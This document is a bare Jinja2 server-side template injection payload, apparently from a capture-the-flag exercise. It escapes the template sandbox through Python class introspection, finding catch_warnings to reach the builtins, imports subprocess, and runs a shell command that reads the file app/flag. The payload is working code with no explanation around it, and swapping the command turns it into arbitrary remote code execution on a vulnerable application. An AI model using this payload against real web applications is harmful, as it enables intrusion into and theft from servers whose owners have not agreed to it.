{% set loadedclasses = ''.__class__.__mro__[1].__subclasses__() %} 
{% for loadedclass in loadedclasses %} 
	{% if loadedclass.__name__ == 'catch_warnings' %} 
		{% set builtinsreference = loadedclass()._module.__builtins__ %} 
		{% set os = builtinsreference['__import__']('subprocess') %}
		{{ os.check_output('cat app/flag', shell=true) }}
	{% endif %} 
{% endfor %} 